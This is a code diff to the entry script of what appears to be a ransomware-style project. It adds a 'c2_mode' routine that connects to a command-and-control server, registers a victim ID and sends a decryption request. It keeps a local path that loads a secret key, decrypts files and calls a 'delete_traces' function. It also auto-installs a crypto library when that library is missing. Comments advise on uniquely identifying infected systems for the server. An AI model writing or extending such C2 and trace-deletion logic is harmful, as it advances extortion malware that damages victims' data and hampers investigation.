@@ -1,10 +1,32 @@
+import asyncio
+import platform 
+
+async def c2_mode(data):
+    program = Program(data=data, mode="c2", system=platform.system())
+    id = data.get("id", "")
+    print("Connecting to C2 server with ID:", id)
+    program.set_id(id)
+
+    # Start connection in background
+    start_task = asyncio.create_task(program.start())
+
+    # Wait until connection is ready
+    await program.connected.wait()
+
+    # Now safe to send request
+    await program.send_decryption_request()
+
+    # wait for decryption
+    await program.decrypted.wait()
+
+    # Optional: stop the program
+    await program.stop()
+
+    # Wait for clean shutdown
+    await start_task
 
 if __name__ == "__main__":
-    # key = load_key()
-    # fernet = Fernet(key)
-    # decrypt_file("mock files/a.txt", "mock files/a.txt", fernet)
     import os
-    import platform 
     import json
 
     system = platform.system()
@@ -23,11 +45,7 @@ if __name__ == "__main__":
 
     with open(path, "r") as conf_file:
         data = json.load(conf_file)
-
-
-    if "c2" in data.values():
-        pass
-
+    from main import Program
 
     import importlib
     try:
@@ -35,9 +53,16 @@ if __name__ == "__main__":
     except ImportError:
         import subprocess
         subprocess.run([sys.executable, '-m', 'pip', 'install', "--user",'cryptography'])
-    from main import Program
 
-    program = Program(data=data, mode="auto", system=platform.system())
-    program.load_key(base + "/secret.key")
-    program.decrypt()
-    program.delete_traces()
+    # TODO: handle c2 mode
+    if data["mode"] == "c2":
+        # Send Decryption request to C2.
+        # A good way to identify the system is to create a unique identifier 
+        # This unique identifier is handler by the server and sent when authenticated
+        # Use that to understand requests.
+        asyncio.run(c2_mode(data))
+    else:
+        program = Program(data=data, mode="auto", system=platform.system())
+        program.load_key(base + "/secret.key")
+        program.decrypt()
+        program.delete_traces()
